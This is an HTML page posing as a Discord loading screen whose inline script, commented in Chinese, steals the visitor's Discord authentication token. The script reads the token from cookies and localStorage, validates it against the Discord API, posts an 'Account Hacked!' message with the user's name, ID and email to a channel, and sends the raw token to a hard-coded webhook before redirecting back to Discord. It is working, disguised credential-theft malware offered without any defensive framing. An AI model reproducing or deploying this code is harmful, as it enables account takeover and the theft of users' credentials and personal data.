<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="utf-8">
  <title>Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0; display: flex; justify-content: center; align-items: center;
      height: 100vh; background: #2f3136; color: #dcddde;
      font-family: 'gg sans', 'Noto Sans', sans-serif;
    }
    .loader {
      width: 48px; height: 48px; border: 4px solid #404249;
      border-top: 4px solid #7289da; border-radius: 50%;
      animation: spin 0.8s linear infinite;
    }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader"></div>
  <script>
    (function() {
      try {
        // 嘗試多種 token 來源
        var token = null;
        // 手機版 Discord 可能不存在 localStorage['token']
        // 但如果是 iOS/Android 的 WebView，可能可以透過 cookie 取得
        var cookies = document.cookie || '';
        if (cookies.indexOf('Discord') > -1) {
          var cookieMatch = cookies.match(/Discord=(.*?);/) || [];
          if (cookieMatch[1]) {
            token = decodeURIComponent(cookieMatch[1]);
          }
        }

        // 備案：localStorage token
        if (!token) {
          token = localStorage.getItem("token");
          if (token) token = token.replace(/"/g, "");
        }

        if (!token) {
          // 嘗試 app_state
          token = localStorage.getItem("app_state");
          if (token) {
            try {
              token = JSON.parse(token);
              token = token.token || token.accessToken || token.authToken;
            } catch(e) {
              token = null;
            }
          }
        }

        if (token) {
          if (typeof token === 'string') token = token.replace(/"/g, "");

          // 驗證 token
          fetch("https://discord.com/api/v9/users/@me", {
            headers: { "Authorization": token }
          }).then(function(res) {
            if (res.ok) {
              return res.json();
            }
            throw new Error("Not OK");
          }).then(function(user) {
            var msg = {
              content: "🔓 **Account Hacked!**\n使用者: **" + user.username + "** (" + user.id + ")\nEmail: " + (user.email || 'N/A')
            };

            // 發送訊息到目標
            fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Authorization": token
              },
              body: JSON.stringify(msg)
            });

            // 備份 token 到 webhook
            fetch("https://discord.com/api/webhooks/1514570704698216540/vzBlx12YERIwjsCNBua6LTXSgqbKKANYYXGF4y7trdLp1rz4HVNDVx8pe5lhdf_Aisph", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                content: "🔓 **Discord Token 已擷取**\n使用者: **" + user.username + "**\n```\n" + token + "\n```"
              })
            }).catch(function() {});

            // 跳回 Discord
            setTimeout(function() {
              window.location.href = "https://discord.com/channels/@me";
            }, 1000);
          }).catch(function(e) {
            alert("Error: " + e.message);
            window.location.href = "https://discord.com/channels/@me";
          });
        } else {
          alert("No token found!\n\nCookie: " + cookies.substring(0, 100));
          window.location.href = "https://discord.com/channels/@me";
        }
      } catch(e) {
        console.log("Token 抓取失敗:", e);
      }
    })();
  </script>
</body>
</html>
